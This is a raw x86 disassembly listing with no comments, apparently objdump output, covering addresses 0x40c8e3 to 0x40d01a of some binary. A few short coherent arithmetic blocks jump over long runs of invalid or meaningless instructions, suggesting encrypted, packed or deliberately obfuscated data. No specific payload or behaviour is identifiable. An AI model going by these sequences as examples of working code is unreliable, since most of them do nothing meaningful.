  40c8e3:	fcomp  QWORD PTR [ebx-0x25]
  40c8e6:	js     0x40c8d8
  40c8e8:	push   es
  40c8e9:	sub    edi,DWORD PTR ds:0x7d8bec5c
  40c8ef:	call   0x7d44c127
  40c8f4:	in     al,dx
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	push   edi
  40c919:	push   cs
  40c91a:	push   esi
  40c91b:	mov    ch,0xec
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c973
  40c925:	shr    DWORD PTR [ebx+ecx*8],0x7c
  40c929:	je     0x40c9a5
  40c92b:	loopne 0x40c8fe
  40c92d:	mov    al,ds:0xc9ac8698
  40c932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c933:	pop    ds
  40c934:	sti    
  40c935:	push   ss
  40c936:	adc    bl,al
  40c938:	cld    
  40c939:	aas    
  40c93a:	push   es
  40c93b:	(bad)
  40c93e:	inc    ecx
  40c93f:	(bad)  
  40c940:	mov    al,0x3d
  40c942:	sub    eax,0x7dcef31a
  40c947:	mov    al,ds:0xeb933d24
  40c94c:	dec    esi
  40c94d:	mov    dl,0x71
  40c94f:	push   ss
  40c950:	sub    cl,BYTE PTR [esi]
  40c952:	add    eax,esi
  40c954:	cmp    al,0x44
  40c956:	pop    esp
  40c957:	jns    0x40c910
  40c959:	dec    edi
  40c95a:	xchg   edx,eax
  40c95b:	push   ebp
  40c95c:	xor    DWORD PTR [ebx+0x291ba313],ecx
  40c962:	repnz xchg edx,eax
  40c964:	mov    edi,0x31427f00
  40c969:	push   cs
  40c96a:	out    dx,eax
  40c96b:	push   ebp
  40c96c:	fistp  WORD PTR [ecx]
  40c96e:	inc    ebp
  40c96f:	nop
  40c970:	sbb    ch,bh
  40c972:	retf   
  40c973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c974:	pusha  
  40c975:	xor    DWORD PTR [eax+0x3d],0x79
  40c979:	cmp    BYTE PTR [edi-0x362b5ebd],bh
  40c97f:	ror    BYTE PTR ss:[ebx-0x80],cl
  40c983:	fnstcw WORD PTR [eax+0x6f54b05b]
  40c989:	jno    0x40c9bc
  40c98b:	jmp    0x40c958
  40c98d:	and    bh,BYTE PTR [ebx-0x60]
  40c990:	inc    esp
  40c991:	mov    ch,0xa3
  40c993:	sub    BYTE PTR [ebx],ah
  40c995:	retf   
  40c996:	jmp    0x40c981
  40c998:	mov    bl,BYTE PTR cs:[ebp-0x24]
  40c99c:	icebp  
  40c99d:	push   0xffffffae
  40c99f:	dec    eax
  40c9a0:	add    BYTE PTR [edx-0x3f],al
  40c9a3:	or     DWORD PTR [esi+ecx*8+0x4f],ecx
  40c9a7:	ins    BYTE PTR es:[edi],dx
  40c9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9a9:	stos   DWORD PTR es:[edi],eax
  40c9aa:	mov    bh,dh
  40c9ac:	lods   al,BYTE PTR ds:[esi]
  40c9ad:	push   ecx
  40c9ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9af:	sub    ebp,DWORD PTR [ecx-0x11]
  40c9b2:	and    BYTE PTR [ecx],0x56
  40c9b5:	test   BYTE PTR [edx-0x5b],bh
  40c9b8:	call   0x43c0f231
  40c9bd:	dec    esp
  40c9be:	jb     0x40c96d
  40c9c0:	call   0x15c4b40
  40c9c5:	xor    al,0xd3
  40c9c7:	lock clc 
  40c9c9:	imul   ebx,DWORD PTR [esp+edi*4-0x160c9512],0xe
  40c9d1:	jne    0x40ca0d
  40c9d3:	(bad)  
  40c9d4:	push   ds
  40c9d5:	push   cs
  40c9d6:	mov    ah,0xd8
  40c9d8:	js     0x40c95c
  40c9da:	jmp    0x40c9ca
  40c9dc:	inc    edi
  40c9dd:	inc    ebp
  40c9de:	push   0xe6c07701
  40c9e3:	xchg   esi,eax
  40c9e4:	add    al,0xf1
  40c9e6:	jno    0x40c9c7
  40c9e8:	adc    edx,DWORD PTR [ebp-0x7c]
  40c9eb:	inc    BYTE PTR [ecx+0x53]
  40c9ee:	dec    edx
  40c9ef:	adc    ah,ch
  40c9f1:	out    0xca,al
  40c9f3:	fwait
  40c9f4:	adc    ah,BYTE PTR ds:0xb7d0f995
  40c9fa:	lods   al,BYTE PTR ds:[esi]
  40c9fb:	sbb    edx,DWORD PTR [ecx+edx*8-0x54ef4b]
  40ca02:	scas   al,BYTE PTR es:[edi]
  40ca03:	adc    dl,bh
  40ca05:	fs clc 
  40ca07:	push   ecx
  40ca08:	xor    dh,bh
  40ca0a:	push   es
  40ca0b:	xchg   esi,eax
  40ca0c:	mov    al,0xb1
  40ca0e:	popf   
  40ca0f:	mov    dh,0xf9
  40ca11:	retf   
  40ca12:	push   ecx
  40ca13:	mov    ecx,0x77751ff5
  40ca18:	ret    0x56b
  40ca1b:	mov    edi,0x192616e4
  40ca20:	push   0xd04c1563
  40ca25:	xor    BYTE PTR [eax],0x3f
  40ca28:	or     eax,0xe538e3fb
  40ca2d:	mov    bh,0xe
  40ca2f:	mov    cl,0x9
  40ca31:	jnp    0x40ca7c
  40ca33:	adc    DWORD PTR [edx+0x198d3dd0],ebx
  40ca39:	outs   dx,BYTE PTR ds:[esi]
  40ca3a:	gs sti 
  40ca3c:	sub    bl,ah
  40ca3e:	dec    edx
  40ca3f:	lds    esp,FWORD PTR [eax+0x46]
  40ca42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca43:	mov    al,ds:0x4bf7bfbd
  40ca48:	mov    edi,0x34a6d0c9
  40ca4d:	and    esp,ebp
  40ca4f:	lods   al,BYTE PTR ds:[esi]
  40ca50:	icebp  
  40ca51:	scas   al,BYTE PTR es:[edi]
  40ca52:	call   0xb128:0x1b41572e
  40ca59:	mov    ah,0x13
  40ca5b:	shl    BYTE PTR [esi-0x56],0x4e
  40ca5f:	les    ebp,FWORD PTR [edx+0x338cc20a]
  40ca65:	and    BYTE PTR [esi-0x7f],ah
  40ca68:	fcom   QWORD PTR [ebx+0x55]
  40ca6b:	gs out 0xdb,al
  40ca6e:	mov    WORD PTR [edx],cs
  40ca70:	push   ss
  40ca71:	mov    ch,0x83
  40ca73:	les    eax,FWORD PTR [ecx]
  40ca75:	ret    0x51b4
  40ca78:	add    eax,0xc31c61be
  40ca7d:	loop   0x40ca6d
  40ca7f:	jb     0x40ca02
  40ca81:	rol    BYTE PTR [esi-0x69],1
  40ca84:	rol    BYTE PTR [eax-0x17fd609],cl
  40ca8a:	adc    eax,0x6e9d44e0
  40ca8f:	scas   eax,DWORD PTR es:[edi]
  40ca90:	pop    edi
  40ca91:	add    DWORD PTR ds:0xf7cdfd52,esi
  40ca97:	jmp    0x4fb8:0x1c5c54ec
  40ca9e:	out    0xe6,eax
  40caa0:	enter  0x81fe,0xb9
  40caa4:	ret    
  40caa5:	xor    BYTE PTR [eax],al
  40caa7:	sbb    eax,0x279499aa
  40caac:	in     al,dx
  40caad:	es pop eax
  40caaf:	xor    DWORD PTR [ebp+ebx*1-0x7e],esp
  40cab3:	scas   al,BYTE PTR es:[edi]
  40cab4:	aas    
  40cab5:	loopne 0x40caf8
  40cab7:	mov    ebx,0xb795905a
  40cabc:	arpl   WORD PTR [esi],cx
  40cabe:	dec    ebp
  40cabf:	(bad)  
  40cac0:	mov    bh,0x1a
  40cac2:	clc    
  40cac3:	mov    cl,0x84
  40cac5:	test   al,0xea
  40cac7:	je     0x40caca
  40cac9:	mov    al,ds:0x64d6e7a3
  40cace:	popa   
  40cacf:	add    al,0x82
  40cad1:	add    dl,0x78
  40cad4:	cmp    DWORD PTR [ebx],0x73
  40cad7:	push   es
  40cad8:	test   BYTE PTR [esi-0x68],dl
  40cadb:	cli    
  40cadc:	jmp    0x151e:0xfaf392ff
  40cae3:	mov    esi,0xa6cadc2d
  40cae8:	test   esp,ecx
  40caea:	(bad)  
  40caeb:	mov    ebp,0x956fda65
  40caf0:	push   ebx
  40caf1:	sbb    dl,BYTE PTR [edx]
  40caf3:	push   0xc5b7f289
  40caf8:	pop    ds
  40caf9:	sar    DWORD PTR ds:0xdcc588bd,cl
  40caff:	pop    ebp
  40cb00:	daa    
  40cb01:	inc    ecx
  40cb02:	addr16 adc bh,dh
  40cb05:	or     al,0x92
  40cb08:	inc    edx
  40cb09:	push   edi
  40cb0a:	data16 mov WORD PTR [eax-0x61da1bc9],fs
  40cb11:	pop    esi
  40cb12:	cmc    
  40cb13:	xchg   esp,eax
  40cb14:	aas    
  40cb15:	sbb    bl,BYTE PTR [ebx]
  40cb17:	rol    esi,1
  40cb19:	pop    eax
  40cb1a:	jne    0x40cac3
  40cb1c:	retf   0x91e
  40cb1f:	xchg   ebp,eax
  40cb20:	bnd jne 0x40cb2a
  40cb23:	sbb    al,0x81
  40cb25:	jbe    0x40caf8
  40cb27:	mov    ecx,0xa7665e5c
  40cb2c:	push   ebx
  40cb2d:	pop    edx
  40cb2e:	and    bl,bl
  40cb30:	ret    0x859c
  40cb33:	push   edx
  40cb34:	in     eax,0x50
  40cb36:	ja     0x40cba8
  40cb38:	jno    0x40cb58
  40cb3a:	(bad)  
  40cb3b:	or     al,0xb9
  40cb3d:	xchg   edi,eax
  40cb3e:	cld    
  40cb3f:	fwait
  40cb40:	cmp    DWORD PTR [edx+0x24d05dc6],0xffffff92
  40cb47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb48:	mov    ds:0x7fa42bb,al
  40cb4d:	xchg   ebx,eax
  40cb4e:	outs   dx,DWORD PTR ds:[esi]
  40cb4f:	(bad)  
  40cb50:	call   0xc97ad79c
  40cb55:	div    BYTE PTR [edi+0x41]
  40cb58:	jle    0x40cb63
  40cb5a:	xchg   BYTE PTR [ebx-0x36],bl
  40cb5d:	cdq    
  40cb5e:	out    0xda,al
  40cb60:	jae    0x40cb10
  40cb62:	cld    
  40cb63:	fldl2e 
  40cb65:	dec    esi
  40cb66:	call   0x17aa:0xd88c2e03
  40cb6d:	push   0x8441aa2f
  40cb72:	mov    bl,0x75
  40cb74:	mov    edi,0xa391bc5a
  40cb79:	and    DWORD PTR [ebp+ebx*8+0x1ba67f7a],eax
  40cb80:	mov    eax,ds:0xe88cee32
  40cb85:	jae    0x40cb69
  40cb87:	push   edx
  40cb88:	jne    0x40cbd2
  40cb8a:	mov    dh,0xc0
  40cb8c:	sub    DWORD PTR [ebp-0xe],ebx
  40cb8f:	xchg   ebp,eax
  40cb90:	loopne 0x40cbe6
  40cb92:	test   BYTE PTR [eax+0x7864660a],dh
  40cb98:	mov    esp,0xa3a2e6f9
  40cb9d:	sahf   
  40cb9e:	push   esp
  40cb9f:	sti    
  40cba0:	ficom  DWORD PTR [ecx-0xf]
  40cba3:	adc    al,ah
  40cba5:	inc    ecx
  40cba6:	jmp    0x9c29:0x25d342fe
  40cbad:	push   eax
  40cbae:	adc    DWORD PTR [ecx-0x12de7b48],edx
  40cbb4:	mov    cl,0xde
  40cbb6:	jae    0x40cbb4
  40cbb8:	lock pop edi
  40cbba:	mov    bh,0x7a
  40cbbc:	lds    esp,FWORD PTR cs:[ebp+0x5b04dc41]
  40cbc3:	jne    0x40cbd2
  40cbc5:	sahf   
  40cbc6:	or     ch,al
  40cbc8:	dec    esp
  40cbc9:	lahf   
  40cbca:	mov    ebp,0x632c9d9a
  40cbcf:	(bad)  
  40cbd0:	loop   0x40cc28
  40cbd2:	add    eax,0x40d1d6a9
  40cbd7:	fwait
  40cbd8:	in     eax,dx
  40cbd9:	call   0x3e9c:0xca7eb7d7
  40cbe0:	jnp    0x40cbdb
  40cbe2:	cmp    al,0xa9
  40cbe4:	mov    ah,0x5c
  40cbe6:	inc    ecx
  40cbe7:	icebp  
  40cbe8:	xor    ebp,DWORD PTR [esi-0x11]
  40cbeb:	mov    esi,eax
  40cbed:	pop    es
  40cbee:	outs   dx,BYTE PTR ds:[esi]
  40cbef:	xor    dl,BYTE PTR [ebx+ebp*1]
  40cbf2:	ss dec edi
  40cbf4:	mov    ebp,0x43b4780f
  40cbf9:	icebp  
  40cbfa:	arpl   sp,bp
  40cbfc:	(bad)  
  40cbfd:	enter  0x8c32,0xc9
  40cc01:	popa   
  40cc02:	jl     0x40cc4a
  40cc04:	adc    ch,al
  40cc06:	fcomp  QWORD PTR [esi]
  40cc08:	jge    0x40cb90
  40cc0a:	xor    al,0xe6
  40cc0c:	push   ds
  40cc0d:	pop    ebx
  40cc0e:	std    
  40cc0f:	inc    eax
  40cc10:	or     DWORD PTR [ecx+edi*2-0x77bc8e35],ebp
  40cc17:	sbb    eax,0x67b799a8
  40cc1c:	push   ds
  40cc1d:	and    al,BYTE PTR ds:0xcb2ca552
  40cc23:	and    eax,edx
  40cc25:	loopne 0x40cc64
  40cc27:	mov    ch,0xdd
  40cc29:	add    BYTE PTR [eax-0x13363c2],ah
  40cc2f:	sbb    al,0x62
  40cc31:	add    esp,DWORD PTR [edx]
  40cc33:	jae    0x40cbd4
  40cc35:	xor    edi,eax
  40cc37:	pop    esi
  40cc38:	jle    0x40cc66
  40cc3a:	jmp    0x801e854
  40cc3f:	ins    DWORD PTR es:[edi],dx
  40cc40:	(bad)  
  40cc41:	test   eax,0x377ff85e
  40cc46:	loopne 0x40cc4a
  40cc48:	outs   dx,BYTE PTR ds:[esi]
  40cc49:	xor    DWORD PTR [ecx],ebp
  40cc4b:	data16 fidiv WORD PTR [edi+0x38]
  40cc4f:	sbb    eax,0xac27b967
  40cc54:	mov    ecx,0xa69ffa67
  40cc59:	sbb    BYTE PTR [edi+0x63],bl
  40cc5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc5d:	mov    ds:0x80d068b1,eax
  40cc62:	pop    edx
  40cc63:	out    0xb0,al
  40cc65:	mov    ds:0x26828237,eax
  40cc6a:	lahf   
  40cc6b:	sbb    BYTE PTR [eax-0x7437cd1a],dh
  40cc71:	xor    ax,cx
  40cc74:	stos   BYTE PTR es:[edi],al
  40cc75:	(bad)
  40cc79:	ins    DWORD PTR es:[edi],dx
  40cc7a:	in     eax,dx
  40cc7b:	inc    ebp
  40cc7c:	mov    eax,0xf4b49272
  40cc81:	push   ss
  40cc82:	xor    BYTE PTR [ecx-0x2d09002f],dh
  40cc88:	cmp    DWORD PTR [edi-0x60],edi
  40cc8b:	xchg   edi,eax
  40cc8c:	dec    ecx
  40cc8d:	aam    0x7d
  40cc8f:	dec    eax
  40cc90:	ins    BYTE PTR es:[di],dx
  40cc92:	shl    cl,0xb1
  40cc95:	in     eax,dx
  40cc96:	retf   0xa9e7
  40cc99:	out    0xe2,eax
  40cc9b:	jge    0x40cc81
  40cc9d:	sub    BYTE PTR [ebx-0x7a],0x3a
  40cca1:	jo     0x40cc47
  40cca3:	sbb    bl,BYTE PTR [ebx+0x191e869d]
  40cca9:	je     0x40ccd5
  40ccab:	push   eax
  40ccac:	jmp    0xbdd0:0x87375647
  40ccb3:	mov    bl,BYTE PTR [esi+0x6af0e99]
  40ccb9:	pop    ds
  40ccba:	pop    ecx
  40ccbb:	pop    ecx
  40ccbc:	lea    esi,ds:0xcc3c4789
  40ccc2:	fs mov eax,0x3f83341
  40ccc8:	rol    DWORD PTR [ebx],1
  40ccca:	stc    
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sbb    esp,0xffffffb0
  40cd18:	ds sbb al,0xb
  40cd1b:	nop
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40ccef
  40cd23:	jb     0x40cda3
  40cd25:	add    al,bh
  40cd27:	jbe    0x40cd2a
  40cd29:	sti    
  40cd2a:	inc    esi
  40cd2b:	aad    0x6c
  40cd2d:	mov    ecx,0x7ac9563e
  40cd32:	or     DWORD PTR [esi+0x67],edi
  40cd35:	repz dec esp
  40cd37:	mov    ecx,0xb42c4686
  40cd3c:	jb     0x40ccd0
  40cd3e:	mov    ah,0xfd
  40cd40:	push   edx
  40cd41:	loopne 0x40cd0a
  40cd43:	into   
  40cd44:	cmc    
  40cd45:	aad    0xcf
  40cd47:	aad    0xc2
  40cd49:	mov    al,0xc1
  40cd4b:	and    eax,0xf8d8c917
  40cd50:	mov    bh,0xd7
  40cd52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd53:	adc    BYTE PTR [esi-0x7f],bl
  40cd56:	pop    esi
  40cd57:	push   0xf8f7712b
  40cd5c:	fwait
  40cd5d:	pusha  
  40cd5e:	das    
  40cd5f:	(bad)  
  40cd60:	push   edx
  40cd61:	inc    edx
  40cd62:	cmp    al,0x9a
  40cd64:	sahf   
  40cd65:	mov    ds:0x571fd79b,al
  40cd6a:	dec    ecx
  40cd6b:	cli    
  40cd6c:	ins    DWORD PTR es:[edi],dx
  40cd6d:	jge    0x40cddb
  40cd6f:	mov    dh,0xd1
  40cd71:	shl    cl,0xf
  40cd74:	std    
  40cd75:	aaa    
  40cd76:	call   0xa265ae5
  40cd7b:	push   eax
  40cd7c:	fcom   st(4)
  40cd7e:	and    DWORD PTR [esi+0x4e128a9c],ebp
  40cd84:	out    dx,eax
  40cd85:	adc    ecx,edx
  40cd87:	adc    eax,0x60d1d6ef
  40cd8c:	jae    0x40cdaf
  40cd8e:	dec    ebx
  40cd8f:	jp     0x40cdf7
  40cd91:	mov    cl,0x6d
  40cd93:	jg     0x40cd5d
  40cd95:	sahf   
  40cd96:	ret    0x1992
  40cd99:	pop    ebp
  40cd9a:	scas   eax,DWORD PTR es:[edi]
  40cd9b:	cmc    
  40cd9c:	fs mov ch,0x54
  40cd9f:	sahf   
  40cda0:	pop    ds
  40cda1:	in     al,dx
  40cda2:	stos   DWORD PTR es:[edi],eax
  40cda3:	ret    0x472c
  40cda6:	les    esi,FWORD PTR [ebp-0x13]
  40cda9:	pusha  
  40cdaa:	inc    ebx
  40cdab:	jg     0x40ce2c
  40cdad:	or     DWORD PTR [esp+eax*4],edx
  40cdb0:	xor    eax,0x21eeb038
  40cdb5:	stos   BYTE PTR es:[edi],al
  40cdb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdb7:	lahf   
  40cdb8:	fnstenv [edi-0x145a6515]
  40cdbe:	sbb    cl,BYTE PTR [edx]
  40cdc0:	push   esp
  40cdc1:	push   edx
  40cdc2:	nop
  40cdc3:	leave  
  40cdc4:	jb     0x40cd5a
  40cdc6:	jb     0x40cda2
  40cdc8:	lock jno 0x40ce07
  40cdcb:	mov    esp,DWORD PTR [esi]
  40cdcd:	add    eax,0xf836cbdb
  40cdd2:	fs sbb edx,edx
  40cdd5:	adc    al,0x31
  40cdd7:	sub    edi,DWORD PTR [ecx-0x2d]
  40cdda:	push   eax
  40cddb:	lea    ebp,[ecx]
  40cddd:	mov    DWORD PTR [edi],ecx
  40cddf:	sub    BYTE PTR [esi+0x5452e127],ch
  40cde5:	cmp    al,0x41
  40cde7:	pusha  
  40cde8:	lock ret 0x9ba4
  40cdec:	in     eax,dx
  40cded:	pop    ebp
  40cdee:	inc    edx
  40cdef:	push   ss
  40cdf0:	outs   dx,DWORD PTR ds:[esi]
  40cdf1:	push   ss
  40cdf2:	imul   esp,DWORD PTR [esi-0x5033bf2a],0x79
  40cdf9:	cmp    al,0xd7
  40cdfb:	dec    ebp
  40cdfc:	xchg   esi,eax
  40cdfd:	cwde   
  40cdfe:	adc    BYTE PTR [eax-0x67e1a629],cl
  40ce04:	and    al,0x47
  40ce06:	xchg   DWORD PTR [ecx+0x70c1075],ecx
  40ce0c:	inc    edi
  40ce0d:	lock and WORD PTR [ebx+0x738d524b],bx
  40ce15:	(bad)
  40ce19:	mov    ?,WORD PTR [ebp+0x2a61c0a3]
  40ce1f:	cmp    esp,DWORD PTR [ebx+0x42b4c0d8]
  40ce25:	mov    al,0x23
  40ce27:	int    0xd8
  40ce29:	lea    eax,[edx]
  40ce2b:	popf   
  40ce2c:	inc    ecx
  40ce2d:	sbb    DWORD PTR [ecx+0x545fb9a4],eax
  40ce33:	sbb    DWORD PTR [ecx+edi*4+0x28],ebx
  40ce37:	pop    ebp
  40ce38:	cld    
  40ce39:	mov    ?,WORD PTR ds:0xe51e323
  40ce3f:	and    eax,0x22332dff
  40ce44:	psubq  mm1,mm3
  40ce47:	inc    esp
  40ce48:	push   edi
  40ce49:	push   0xfe238707
  40ce4e:	dec    esi
  40ce4f:	lea    edi,[ebx]
  40ce51:	cmc    
  40ce52:	push   edx
  40ce53:	ret    0x7a95
  40ce56:	inc    edx
  40ce57:	out    0xe8,eax
  40ce59:	or     al,0x28
  40ce5b:	stc    
  40ce5c:	or     esp,esi
  40ce5e:	inc    edx
  40ce5f:	jmp    0xea6102b1
  40ce64:	fsub   QWORD PTR [ecx-0x7721830a]
  40ce6a:	push   ecx
  40ce6b:	sahf   
  40ce6c:	push   0x95cc2119
  40ce71:	and    al,BYTE PTR [ecx-0x7e]
  40ce74:	out    dx,eax
  40ce75:	add    bh,BYTE PTR [ebp+0xbb029c3]
  40ce7b:	pushf  
  40ce7c:	inc    ecx
  40ce7d:	in     al,dx
  40ce7e:	dec    ecx
  40ce7f:	out    0x85,eax
  40ce81:	call   0x753d:0x5c0b1faf
  40ce88:	jg     0x40ce35
  40ce8a:	jb     0x40cebc
  40ce8c:	bts    DWORD PTR [ebx-0x2d775171],ebx
  40ce93:	pop    edi
  40ce94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce95:	ds clc 
  40ce97:	aaa    
  40ce98:	xchg   esi,eax
  40ce99:	out    dx,al
  40ce9a:	shr    eax,cl
  40ce9c:	push   esp
  40ce9d:	les    esi,FWORD PTR [esi+0x23]
  40cea0:	adc    al,0xf2
  40cea2:	jno    0x40cefc
  40cea4:	add    DWORD PTR [ebx+0x50],eax
  40cea7:	jecxz  0x40ced1
  40cea9:	inc    eax
  40ceaa:	xchg   BYTE PTR [esi],ch
  40ceac:	lods   eax,DWORD PTR ds:[esi]
  40cead:	imul   ebx,DWORD PTR [ebx],0xd6e7c5f3
  40ceb3:	sbb    al,0xab
  40ceb5:	mov    cl,0x6f
  40ceb7:	jnp    0x40ce63
  40ceb9:	xchg   ecx,eax
  40ceba:	imul   DWORD PTR [edi]
  40cebc:	out    0xc7,al
  40cebe:	mov    WORD PTR [ebp+0x13f68597],gs
  40cec4:	adc    eax,0xe4db6173
  40cec9:	mov    ds:0xc769e876,eax
  40cece:	lea    ebp,[ebp-0x21]
  40ced1:	test   eax,0x15d74f95
  40ced6:	push   ds
  40ced7:	js     0x40cedd
  40ced9:	jns    0x40ceee
  40cedb:	cdq    
  40cedc:	mov    ebx,0xb0d5b800
  40cee1:	pop    ecx
  40cee2:	cwde   
  40cee3:	dec    ebp
  40cee4:	retf   0x4bfa
  40cee7:	xor    eax,0xb832b783
  40ceec:	fmul   DWORD PTR [edx+0x7b]
  40ceef:	test   esi,edi
  40cef1:	push   esp
  40cef2:	inc    eax
  40cef3:	test   al,0x6d
  40cef5:	out    dx,eax
  40cef6:	stos   BYTE PTR es:[edi],al
  40cef7:	xchg   esp,eax
  40cef8:	cli    
  40cef9:	fisttp DWORD PTR [ebx-0x2f]
  40cefc:	mov    dh,0xef
  40cefe:	aas    
  40ceff:	jae    0x40cef1
  40cf01:	xchg   DWORD PTR [esi],ecx
  40cf03:	dec    ebp
  40cf04:	ins    BYTE PTR es:[edi],dx
  40cf05:	or     al,0x74
  40cf07:	int3   
  40cf08:	mov    ch,0xe3
  40cf0a:	into   
  40cf0b:	xchg   edi,eax
  40cf0c:	cmp    dl,dh
  40cf0e:	(bad)  
  40cf0f:	into   
  40cf10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf11:	dec    ecx
  40cf12:	sar    DWORD PTR ds:0x5d5383e8,cl
  40cf18:	shl    al,cl
  40cf1a:	add    al,0xe5
  40cf1c:	int    0x8f
  40cf1e:	mov    dl,0x8
  40cf20:	popa   
  40cf21:	mov    dh,0x22
  40cf23:	push   edi
  40cf24:	or     ebp,ebp
  40cf26:	bsr    edi,DWORD PTR [ebx+0x44699bfe]
  40cf2d:	xchg   esp,eax
  40cf2e:	inc    esp
  40cf2f:	jge    0x40ceb6
  40cf31:	sub    DWORD PTR ds:0x3143b7cb,esp
  40cf37:	mov    ?,WORD PTR [ecx+0x24]
  40cf3a:	xor    al,0x2c
  40cf3c:	loope  0x40cf12
  40cf3e:	out    0xf0,eax
  40cf40:	and    BYTE PTR [ebx],0xf1
  40cf43:	adc    dh,cl
  40cf45:	mov    eax,0xff9866df
  40cf4a:	mov    ebp,0x975aeab
  40cf4f:	push   eax
  40cf50:	jg     0x40cf08
  40cf52:	xchg   ebx,eax
  40cf53:	(bad)  
  40cf54:	cmp    BYTE PTR [ebp+0x6a],dl
  40cf57:	fwait
  40cf58:	mov    ah,BYTE PTR [ecx]
  40cf5a:	popa   
  40cf5b:	jne    0x40cf93
  40cf5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf5e:	mov    ebp,DWORD PTR [ebx+0x1a]
  40cf61:	xchg   esi,eax
  40cf62:	js     0x40cfaa
  40cf64:	jg     0x40cf43
  40cf66:	or     DWORD PTR [eax],edi
  40cf68:	ret    0x9ea2
  40cf6b:	repz fiadd WORD PTR [ecx]
  40cf6e:	xchg   esi,eax
  40cf6f:	aas    
  40cf70:	in     eax,dx
  40cf71:	sub    eax,0xded7bc3
  40cf76:	inc    edx
  40cf77:	js     0x40cff0
  40cf79:	outs   dx,BYTE PTR ds:[esi]
  40cf7a:	imul   ebx,ebp,0x6901f1b
  40cf80:	mov    ds:0x363e8f0,eax
  40cf85:	adc    ch,BYTE PTR [edi+0x4ae6bda4]
  40cf8b:	inc    edi
  40cf8c:	sbb    dl,BYTE PTR [ecx]
  40cf8e:	push   edx
  40cf8f:	mov    bh,BYTE PTR [esi+0x377b85df]
  40cf95:	sub    ch,bl
  40cf97:	(bad)  
  40cf98:	cmpxchg edx,ebp
  40cf9b:	das    
  40cf9c:	ins    BYTE PTR es:[edi],dx
  40cf9d:	bound  eax,QWORD PTR [ebx]
  40cf9f:	fbld   TBYTE PTR [esi-0x7a7ed03f]
  40cfa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfa6:	fs add al,0xa8
  40cfa9:	out    0x27,al
  40cfab:	push   eax
  40cfac:	pusha  
  40cfad:	push   ecx
  40cfae:	(bad)  
  40cfaf:	rcl    DWORD PTR [edi+edi*8-0x5ddab507],1
  40cfb6:	mov    eax,?
  40cfb8:	popf   
  40cfb9:	loopne 0x40cf92
  40cfbb:	dec    ecx
  40cfbc:	test   BYTE PTR [eax-0x6f],ch
  40cfbf:	sahf   
  40cfc0:	in     eax,dx
  40cfc1:	cmp    eax,0x11c54492
  40cfc6:	mov    esp,0xc54e5f3
  40cfcb:	dec    edx
  40cfcc:	mov    esi,DWORD PTR [ebx]
  40cfce:	push   ebp
  40cfcf:	sub    eax,0xcf72e6f2
  40cfd4:	lahf   
  40cfd5:	repz jae 0x40cfdf
  40cfd8:	ins    BYTE PTR es:[edi],dx
  40cfd9:	pop    eax
  40cfda:	cmp    ebx,DWORD PTR [ecx+eax*1]
  40cfdd:	sti    
  40cfde:	outs   dx,DWORD PTR ds:[esi]
  40cfdf:	bound  esp,QWORD PTR [ebp+0x49]
  40cfe2:	jae    0x40cf90
  40cfe4:	mov    gs,WORD PTR [esi+0x4675c569]
  40cfea:	fiadd  DWORD PTR [ebx+eiz*8]
  40cfed:	mov    dl,0xdb
  40cfef:	cmp    BYTE PTR [edx+edi*1+0x198e93fb],cl
  40cff6:	or     edi,DWORD PTR [eax-0x6d]
  40cff9:	jns    0x40d074
  40cffb:	jecxz  0x40d020
  40cffd:	cli    
  40cffe:	xor    dh,bl
  40d000:	mov    eax,ds:0x8e0f87bf
  40d005:	jne    0x40cfef
  40d007:	mov    al,ds:0x44de9119
  40d00c:	pushf  
  40d00d:	addr16 push ecx
  40d00f:	dec    eax
  40d010:	push   ecx
  40d011:	mov    ebx,0x22098f37
  40d016:	adc    DWORD PTR [edi+esi*4+0x1f],edx
  40d01a:	push   ds
